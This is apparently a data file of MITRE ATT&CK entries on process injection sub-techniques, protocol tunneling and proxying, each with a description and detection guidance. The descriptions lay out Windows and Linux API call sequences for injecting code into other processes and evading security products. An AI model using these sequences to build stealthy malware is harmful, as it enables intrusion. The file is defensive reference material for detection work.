{"ID":"T1055.015","name":"Process Injection: ListPlanting","description":"Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.\n\nList-view controls are user interface windows used to display collections of items.(Citation: Microsoft List View Controls) Information about an application's list-view settings are stored within the process' memory in a <code>SysListView32</code> control.\n\nListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.(Citation: Modexp Windows Process Injection) Adversaries must first copy code into the target process’ memory space, which can be performed various ways including by directly obtaining a handle to the <code>SysListView32</code> child of the victim process window (via Windows API calls such as <code>FindWindow</code> and/or <code>EnumWindows</code>) or other [Process Injection](https://attack.mitre.org/techniques/T1055) methods.\n\nSome variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored <code>WriteProcessMemory</code> function. For example, an adversary can use the <code>PostMessage</code> and/or <code>SendMessage</code> API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code> messages, effectively copying a payload 2 bytes at a time to the allocated memory.(Citation: ESET InvisiMole June 2020) \n\nFinally, the payload is triggered by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code> child of the process window, with the payload within the newly allocated buffer passed and executed as the <code>ListView_SortItems</code> callback.","url":"https://attack.mitre.org/techniques/T1055/015","created":"22 November 2021","last modified":"08 March 2022","version":"1.0","tactics":"Defense Evasion, Privilege Escalation","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>FindWindow</code>, <code>FindWindowEx</code>, <code>EnumWindows</code>, <code>EnumChildWindows</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be abused for this technique. \n\nConsider monitoring for excessive use of <code>SendMessage</code> and/or <code>PostMessage</code> API functions with <code>LVM_SETITEMPOSITION</code> and/or <code>LVM_GETITEMPOSITION</code> arguments.\n\nAnalyze process behavior to determine if a process is performing unusual actions, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":"Windows","data sources":"Process: OS API Execution, Process: Process Modification","is sub-technique":true,"sub-technique of":"T1055","defenses bypassed":null,"contributors":"ESET","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET InvisiMole June 2020),"}
{"ID":"T1055.002","name":"Process Injection: Portable Executable Injection","description":"Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Elastic Process Injection July 2017) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process. ","url":"https://attack.mitre.org/techniques/T1055/002","created":"14 January 2020","last modified":"18 October 2021","version":"1.1","tactics":"Defense Evasion, Privilege Escalation","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":"Windows","data sources":"Process: OS API Execution, Process: Process Access, Process: Process Modification","is sub-technique":true,"sub-technique of":"T1055","defenses bypassed":"Anti-virus, Application control","contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Talos Rocke August 2018),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: FireEye CARBANAK June 2017),(Citation: BiZone Lizar May 2021),(Citation: ESET GreyEnergy Oct 2018),(Citation: ESET InvisiMole June 2020),(Citation: GDATA Zeus Panda June 2017),"}
{"ID":"T1055.009","name":"Process Injection: Proc Memory","description":"Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. \n\nProc memory injection involves enumerating the memory of a process via the /proc filesystem (<code>/proc/[pid]</code>) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within <code>/proc/[pid]/maps</code> can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux Injection)(Citation: DD Man) \n\nOther techniques such as [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) may be used to populate a target process with more available gadgets. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), proc memory injection may target child processes (such as a backgrounded copy of sleep).(Citation: GDS Linux Injection) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process. ","url":"https://attack.mitre.org/techniques/T1055/009","created":"14 January 2020","last modified":"20 June 2020","version":"1.0","tactics":"Defense Evasion, Privilege Escalation","detection":"File system monitoring can determine if /proc files are being modified. Users should not have permission to modify these in most cases. \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":"Linux","data sources":"File: File Modification","is sub-technique":true,"sub-technique of":"T1055","defenses bypassed":"Anti-virus, Application control","contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1055.013","name":"Process Injection: Process Doppelgänging","description":"Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. \n\nWindows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)\n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017)\n\nAdversaries may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055). Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelgänging Dec 2017)\n\nProcess Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017):\n\n* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.\n* Load – Create a shared section of memory and load the malicious executable.\n* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.\n* Animate – Create a process from the tainted section of memory and initiate execution.\n\nThis behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process. ","url":"https://attack.mitre.org/techniques/T1055/013","created":"14 January 2020","last modified":"09 February 2021","version":"1.0","tactics":"Defense Evasion, Privilege Escalation","detection":"Monitor and analyze calls to <code>CreateTransaction</code>, <code>CreateFileTransacted</code>, <code>RollbackTransaction</code>, and other rarely used functions indicative of TxF activity. Process Doppelgänging also invokes an outdated and undocumented implementation of the Windows process loader via calls to <code>NtCreateProcessEx</code> and <code>NtCreateThreadEx</code> as well as API calls used to modify memory within another process, such as <code>WriteProcessMemory</code>. (Citation: BlackHat Process Doppelgänging Dec 2017) (Citation: hasherezade Process Doppelgänging Dec 2017)\n\nScan file objects reported during the PsSetCreateProcessNotifyRoutine, (Citation: Microsoft PsSetCreateProcessNotifyRoutine routine) which triggers a callback whenever a process is created or deleted, specifically looking for file objects with enabled write access. (Citation: BlackHat Process Doppelgänging Dec 2017) Also consider comparing file objects loaded in memory to the corresponding file on disk. (Citation: hasherezade Process Doppelgänging Dec 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":"Windows","data sources":"File: File Metadata, Process: OS API Execution","is sub-technique":true,"sub-technique of":"T1055","defenses bypassed":"Anti-virus, Application control","contributors":null,"permissions required":"Administrator, SYSTEM, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCC Group Team9 June 2020),(Citation: Kaspersky Lab SynAck May 2018),(Citation: Symantec Leafminer July 2018),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Cybereason Bazar July 2020),"}
{"ID":"T1055.012","name":"Process Injection: Process Hollowing","description":"Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017)\n\nThis is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. ","url":"https://attack.mitre.org/techniques/T1055/012","created":"14 January 2020","last modified":"29 November 2021","version":"1.2","tactics":"Defense Evasion, Privilege Escalation","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nProcessing hollowing commonly involves spawning an otherwise benign victim process. Consider correlating detections of processes created in a suspended state (ex: through API flags or process’ thread metadata) with other malicious activity such as attempts to modify a process' memory, especially by its parent process, or other abnormal process behavior.(Citation: Nviso Spoof Command Line 2020)(Citation: Mandiant Endpoint Evading 2019)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":"Windows","data sources":"Process: OS API Execution, Process: Process Access, Process: Process Modification","is sub-technique":true,"sub-technique of":"T1055","defenses bypassed":"Anti-virus, Application control","contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCC Group Team9 June 2020),(Citation: Palo Alto Networks BBSRAT),(Citation: Securelist LuckyMouse June 2018),(Citation: EFF Manul Aug 2016),(Citation: Cybereason Astaroth Feb 2019),(Citation: Trend Micro DRBControl February 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Accenture Hogfish April 2018),(Citation: Forcepoint Monsoon),(Citation: FireEye NETWIRE March 2019),(Citation: ATT QakBot April 2021),(Citation: Cybereason Bazar July 2020),(Citation: S2 Grupo TrickBot June 2017),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Cyberreason Anchor December 2019),(Citation: RecordedFuture WhisperGate Jan 2022),(Citation: Talos Kimsuky Nov 2021),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Infoblox Lokibot January 2019),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: Red Canary NETWIRE January 2020),(Citation: Talos Lokibot Jan 2021),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: CheckPoint Bandook Nov 2020),(Citation: Symantec W32.Duqu),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Trend Micro Totbrick Oct 2016),(Citation: Microsoft Dofoil 2018),(Citation: FireEye Ursnif Nov 2017),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Unit42 Azorult Nov 2018),(Citation: Securelist Dtrack),(Citation: Microsoft Totbrick Oct 2017),(Citation: Cymmetria Patchwork),(Citation: Profero APT27 December 2020),(Citation: Malwarebytes SmokeLoader 2016),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: OilRig New Delivery Oct 2017),(Citation: Cybereason Cobalt Kitty 2017),"}
{"ID":"T1055.008","name":"Process Injection: Ptrace System Calls","description":"Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPtrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.(Citation: PTRACE man) Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>) then invoking that memory with <code>PTRACE_SETREGS</code> to set the register containing the next instruction to execute. Ptrace system call injection can also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction). (Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018) \n\nPtrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.(Citation: BH Linux Inject) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process. ","url":"https://attack.mitre.org/techniques/T1055/008","created":"14 January 2020","last modified":"18 October 2021","version":"1.1","tactics":"Defense Evasion, Privilege Escalation","detection":"Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":"Linux","data sources":"Process: OS API Execution, Process: Process Access, Process: Process Modification","is sub-technique":true,"sub-technique of":"T1055","defenses bypassed":"Anti-virus, Application control","contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1055.003","name":"Process Injection: Thread Execution Hijacking","description":"Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Elastic Process Injection July 2017)\n\nThis is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) but targets an existing process rather than creating a process in a suspended state.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. ","url":"https://attack.mitre.org/techniques/T1055/003","created":"14 January 2020","last modified":"18 October 2021","version":"1.1","tactics":"Defense Evasion, Privilege Escalation","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":"Windows","data sources":"Process: OS API Execution, Process: Process Access, Process: Process Modification","is sub-technique":true,"sub-technique of":"T1055","defenses bypassed":"Anti-virus, Application control","contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Securelist WhiteBear Aug 2017),(Citation: ESET Gazer Aug 2017),(Citation: Secureworks Karagany July 2019),(Citation: Trend Micro Waterbear December 2019),"}
{"ID":"T1055.005","name":"Process Injection: Thread Local Storage","description":"Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. \n\nTLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other [Process Injection](https://attack.mitre.org/techniques/T1055) techniques such as [Process Hollowing](https://attack.mitre.org/techniques/T1055/012).(Citation: FireEye TLS Nov 2017)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process. ","url":"https://attack.mitre.org/techniques/T1055/005","created":"14 January 2020","last modified":"18 October 2021","version":"1.1","tactics":"Defense Evasion, Privilege Escalation","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":"Windows","data sources":"Process: OS API Execution, Process: Process Access, Process: Process Modification","is sub-technique":true,"sub-technique of":"T1055","defenses bypassed":"Anti-virus, Application control","contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: TrendMicro PE_URSNIF.A2),(Citation: TrendMicro Ursnif Mar 2015),(Citation: FireEye Ursnif Nov 2017),"}
{"ID":"T1055.014","name":"Process Injection: VDSO Hijacking","description":"Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nVDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008). However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).(Citation: ELF Injection May 2009)(Citation: Backtrace VDSO)(Citation: VDSO Aug 2005)(Citation: Syscall 2014)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.  ","url":"https://attack.mitre.org/techniques/T1055/014","created":"14 January 2020","last modified":"07 July 2022","version":"1.1","tactics":"Defense Evasion, Privilege Escalation","detection":"Monitor for malicious usage of system calls, such as ptrace and mmap, that can be used to attach to, manipulate memory, then redirect a processes' execution path. Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)(Citation: GNU Acct)(Citation: RHEL auditd)(Citation: Chokepoint preload rootkits) \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":"Linux","data sources":"Module: Module Load, Process: OS API Execution","is sub-technique":true,"sub-technique of":"T1055","defenses bypassed":"Anti-virus, Application control","contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1572","name":"Protocol Tunneling","description":"Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \n\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling) \n\n[Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) \n\nAdversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure. ","url":"https://attack.mitre.org/techniques/T1572","created":"15 March 2020","last modified":"27 March 2020","version":"1.0","tactics":"Command and Control","detection":"Monitoring for systems listening and/or establishing external connections using ports/protocols commonly associated with tunneling, such as SSH (port 22). Also monitor for processes commonly associated with tunneling, such as Plink and the OpenSSH client. \n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Trend Micro Ngrok September 2020),(Citation: Cyware Ngrok May 2019),(Citation: NCC Group Chimera January 2021),(Citation: Talos Cobalt Group July 2018),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Kaspersky QakBot September 2021),(Citation: PTSecurity Cobalt Dec 2016),(Citation: FireEye APT34 July 2019),(Citation: Mythc Documentation),(Citation: BlackBerry CostaRicto November 2020),(Citation: Trend Micro Cyclops Blink March 2022),(Citation: Dragos Crashoverride 2017),(Citation: CrowdStrike PIONEER KITTEN August 2020),(Citation: FireEye FIN6 April 2016),(Citation: Kaspersky Lyceum October 2021),(Citation: Symantec W32.Duqu),(Citation: MalwareBytes Ngrok February 2020),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Unit42 OilRig Playbook 2023),(Citation: Group IB Cobalt Aug 2017),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: DFIR Phosphorus November 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: cobaltstrike manual),(Citation: ClearSky Pay2Kitten December 2020),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: FireEye Maze May 2020),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Trend Micro Black Basta October 2022),"}
{"ID":"T1090","name":"Proxy","description":"Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\n\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.","url":"https://attack.mitre.org/techniques/T1090","created":"31 May 2017","last modified":"30 August 2021","version":"3.1","tactics":"Command and Control","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\n\nConsider monitoring for traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183)).","platforms":"Linux, Network, Windows, macOS","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Heather Linn; Jon Sheedy; Walker Johnson","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET Turla PowerShell May 2019),(Citation: Securelist fileless attacks Feb 2017),(Citation: TrendMicro EarthLusca 2022),(Citation: NJCCIC Ursnif Sept 2016),(Citation: Volexity Patchwork June 2018),(Citation: Dell Dridex Oct 2015),(Citation: TrendMicro Lazarus Nov 2018),(Citation: Proofpoint TA505 October 2019),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: JPCert BlackTech Malware September 2019),(Citation: US-CERT TYPEFRAME June 2018),(Citation: FoxIT Wocao December 2019),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: JPCert PLEAD Downloader June 2018),(Citation: TrendMicro Patchwork Dec 2017),(Citation: ProofPoint Ursnif Aug 2016),(Citation: ESET Telebots Dec 2016),(Citation: Microsoft POLONIUM June 2022),(Citation: Riskiq Remcos Jan 2018),(Citation: Check Point Pay2Key November 2020),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: US-CERT HARDRAIN March 2018),(Citation: Kaspersky Adwind Feb 2016),(Citation: FireEye APT41 Aug 2019),(Citation: Symantec Vasport May 2012),(Citation: Bitdefender Naikon April 2021),(Citation: Red Canary NETWIRE January 2020),(Citation: US-CERT BADCALL),(Citation: Mandiant APT41),(Citation: Check Point Warzone Feb 2020),(Citation: Zdnet Ngrok September 2018),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: GitHub PoshC2),(Citation: ESET ForSSHe December 2018),(Citation: Talos ZxShell Oct 2014),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: MalwareBytes Ngrok February 2020),(Citation: NCSC Joint Report Public Tools),(Citation: Crowdstrike DNC June 2016),(Citation: GitHub QuasarRAT),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Operation Quantum Entanglement),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: DFIR Phosphorus November 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: ClearSky Pay2Kitten December 2020),(Citation: ESET Windigo Mar 2014),(Citation: Bleeping Computer Op Sharpshooter March 2019),(Citation: Checkpoint Dridex Jan 2021),(Citation: Talos Bisonal Mar 2020),(Citation: CheckPoint Naikon May 2020),(Citation: RedCanary Mockingbird May 2020),(Citation: University of Birmingham C2)"}
